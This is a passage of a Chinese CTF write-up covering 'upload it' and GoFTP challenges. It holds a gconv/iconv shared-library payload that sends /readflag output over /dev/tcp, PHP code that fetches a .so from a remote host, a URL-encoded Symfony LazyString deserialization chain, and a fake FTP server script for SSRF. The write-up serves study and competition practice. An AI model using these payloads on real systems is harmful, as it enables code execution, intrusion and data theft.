</span></span><span class=line><span class=cl><span class=nx>code</span> <span class=o>+=</span> <span class=s2>&#34;...&#34;</span> <span class=o>+</span> <span class=nx>craft</span><span class=o>.</span><span class=nx>makeSTR</span><span class=p>(</span><span class=s2>&#34;unserialize&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=nx>arb</span><span class=p>(</span><span class=nx>payload</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>code</span> <span class=o>+=</span> <span class=s2>&#34;));&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#code += craft.make(&#34;var_dump(end(getallheaders()))&#34;) + &#34;;&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s1>&#39;http://172.17.16.1/poc.so&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SplFileObject</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span> <span class=o>!</span> <span class=nv>$file</span><span class=o>-&gt;</span><span class=na>eof</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nv>$a</span><span class=o>.</span><span class=nv>$file</span><span class=o>-&gt;</span><span class=na>fgets</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$file</span><span class=o>=</span><span class=k>new</span> <span class=nx>SplFileObject</span><span class=p>(</span><span class=s1>&#39;/tmp/p.so&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$file</span><span class=o>-&gt;</span><span class=na>fwrite</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdlib.h&gt;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>void</span> <span class=nx>gconv</span><span class=p>()</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>void</span> <span class=nx>gconv_init</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>puts</span><span class=p>(</span><span class=s2>&#34;pwned&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;/readflag&gt;/dev/tcp/ip/port&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å‚è€ƒhttps://xz.aliyun.com/t/8669#toc-5</p><p>ç”¨åŸç”Ÿç±»æŠŠsoå’Œmodulesä¸Šä¼ åˆ°tmpç„¶åç”¨ä¼ªåè®®è¯»ä¸€ä¸‹è§¦å‘ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;GCONV_PATH=/tmp/&#34;</span><span class=p>);</span><span class=nx>show_source</span><span class=p>(</span><span class=s2>&#34;php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=upload-it-2>upload it 2</h3><p>æ ¹æ®upload it 1 å¾—çŸ¥ç”¨sleepè§¦å‘ï¼Œè¿˜æ˜¯ä¸€æ ·ç”¨LazyStringè°ƒä¸€ä¸‹sandboxçš„backdooræ–¹æ³•</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Symfony\Component\String</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>LazyString</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$value</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>value</span> <span class=o>=</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>sandbox</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=nv>$evil</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evil</span> <span class=o>=</span> <span class=s2>&#34;/flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>use</span> <span class=nx>Symfony\Component\String\LazyString</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$value</span> <span class=o>=</span> <span class=p>[</span><span class=k>new</span> <span class=nx>sandbox</span><span class=p>,</span><span class=s2>&#34;backdoor&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$lazy</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>LazyString</span><span class=p>(</span><span class=nv>$value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$part1</span> <span class=o>=</span> <span class=nx>urlencode</span><span class=p>(</span><span class=s1>&#39;upload_path|s:45:&#34;/tmp/sandbox/2b2f38818b2ac2cd6df0b9cd09e1ad88&#34;;|&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nv>$part1</span><span class=o>.</span><span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$lazy</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>6</span><span class=nx>c</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>5</span><span class=nx>f</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>68</span><span class=o>%</span><span class=mi>7</span><span class=nx>c</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>34</span><span class=o>%</span><span class=mi>35</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>2</span><span class=nx>f</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>6</span><span class=nx>d</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>2</span><span class=nx>f</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>78</span><span class=o>%</span><span class=mi>2</span><span class=nx>f</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>33</span><span class=o>%</span><span class=mi>38</span><span class=o>%</span><span class=mi>38</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>38</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>36</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>30</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>39</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>30</span><span class=o>%</span><span class=mi>39</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>38</span><span class=o>%</span><span class=mi>38</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>7</span><span class=nx>c</span><span class=o>%</span><span class=mi>4</span><span class=nx>f</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>33</span><span class=o>%</span><span class=mi>35</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>53</span><span class=o>%</span><span class=mi>79</span><span class=o>%</span><span class=mi>6</span><span class=nx>d</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>79</span><span class=o>%</span><span class=mi>5</span><span class=nx>c</span><span class=o>%</span><span class=mi>43</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>d</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>5</span><span class=nx>c</span><span class=o>%</span><span class=mi>53</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=nx>c</span><span class=o>%</span><span class=mi>4</span><span class=nx>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>7</span><span class=nx>a</span><span class=o>%</span><span class=mi>79</span><span class=o>%</span><span class=mi>53</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>7</span><span class=nx>b</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>34</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>53</span><span class=o>%</span><span class=mi>79</span><span class=o>%</span><span class=mi>6</span><span class=nx>d</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>79</span><span class=o>%</span><span class=mi>5</span><span class=nx>c</span><span class=o>%</span><span class=mi>43</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>d</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>5</span><span class=nx>c</span><span class=o>%</span><span class=mi>53</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>5</span><span class=nx>c</span><span class=o>%</span><span class=mi>4</span><span class=nx>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>7</span><span class=nx>a</span><span class=o>%</span><span class=mi>79</span><span class=o>%</span><span class=mi>53</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>6</span><span class=nx>c</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>7</span><span class=nx>b</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>30</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>4</span><span class=nx>f</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>37</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>78</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>32</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>7</span><span class=nx>b</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>33</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>6</span><span class=nx>e</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>78</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>65</span><span class=o>%</span><span class=mi>76</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>6</span><span class=nx>c</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>35</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>2</span><span class=nx>f</span><span class=o>%</span><span class=mi>66</span><span class=o>%</span><span class=mi>6</span><span class=nx>c</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>67</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>75</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>6</span><span class=nx>c</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>5</span><span class=nx>f</span><span class=o>%</span><span class=mi>70</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>74</span><span class=o>%</span><span class=mi>68</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>4</span><span class=nx>e</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>7</span><span class=nx>d</span><span class=o>%</span><span class=mi>69</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>31</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>73</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>38</span><span class=o>%</span><span class=mi>3</span><span class=nx>a</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>62</span><span class=o>%</span><span class=mi>61</span><span class=o>%</span><span class=mi>63</span><span class=o>%</span><span class=mi>6</span><span class=nx>b</span><span class=o>%</span><span class=mi>64</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>6</span><span class=nx>f</span><span class=o>%</span><span class=mi>72</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>b</span><span class=o>%</span><span class=mi>7</span><span class=nx>d</span><span class=o>%</span><span class=mi>7</span><span class=nx>d</span>
</span></span></code></pre></td></tr></table></div></div><p>è´´burpä¸Šdecodeä¸€ä¸‹poståˆ°tmpç›®å½•è¦†ç›–session</p><h3 id=goftp>GoFTP</h3><p>æ ¹æ®é¢˜ç›®æè¿°å’Œ hint ä¿¡æ¯å¯ä»¥å¤§æ¦‚çŒœåˆ°é¢„æœŸé€šè¿‡ FTP æ¥åš SSRFï¼ˆPASV æ¨¡å¼ä¼ æ–‡ä»¶æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå»ºç«‹ä¸€ä¸ªæ–°çš„è¿æ¥åˆ°æœåŠ¡ç«¯æŒ‡å®šç«¯å£ï¼‰ã€‚å…·ä½“çš„ HTTP è¯·æ±‚å†…å®¹åœ¨æ¯”èµ›çš„æ—¶å€™æ˜¯é€šè¿‡ç»“åˆé€†å‘å’ŒåŠ¨æ€è°ƒè¯•çš„æ–¹å¼ï¼Œè§¦å‘ binary /api/register æ¥å£æœ¬åœ°ç›‘å¬è·å¾—çš„ã€‚åœ¨é€šè¿‡ SSRF æ³¨å†Œ username ä¸º admin çš„ç”¨æˆ·ä¹‹åï¼Œå¯æ­£å¸¸ç™»å½•é€šè¿‡è®¿é—® /admin è·å¾— flagã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CoffeeScript data-lang=CoffeeScript><span class=line><span class=cl><span class=c1>#!/usr/bin/env python3
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>from</span> <span class=nx>pwn</span> <span class=nx>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>import</span> <span class=nx>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>context.log_level = </span><span class=s>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>l = </span><span class=nx>listen</span><span class=p>(</span><span class=mi>2121</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>_ = </span><span class=nx>l</span><span class=p>.</span><span class=nx>wait_for_connection</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>data = </span><span class=nx>listen</span><span class=p>(</span><span class=mi>9000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;220 Test FTP Server&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>recvuntil</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;USER &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;331 Password required&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>recvuntil</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;PASS&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;230 User logged in&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>recvuntil</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;TYPE&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;200 Switching to Binary mode&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>recvuntil</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;PASV&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>time</span><span class=p>.</span><span class=nx>sleep</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;227 Entering Passive Mode (127,0,0,1,35,40)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>recvuntil</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;STOR&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;150 Opening BINARY mode data connection for foo.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#_ = data.wait_for_connection()
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>#data.recvall()
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>sendline</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;226 Transfer complete&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>recvuntil</span><span class=p>(</span><span class=nx>b</span><span class=s>&#39;QUIT&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>l</span><span class=p>.</span><span class=nx>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PUT /api/user HTTP/1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host: 127.0.0.1:9000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User-Agent: GRequests/0.10
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Content-Length: 71
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Content-Type: application/json
